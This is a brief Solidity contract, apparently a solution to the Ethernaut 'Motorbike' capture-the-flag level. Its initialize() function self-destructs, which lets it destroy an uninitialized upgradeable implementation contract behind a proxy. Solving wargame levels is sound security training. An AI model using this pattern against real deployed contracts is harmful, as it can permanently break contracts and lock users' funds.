// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract MotorbikeSolution {
    function initialize() external {
        selfdestruct(msg.sender);
    }
}
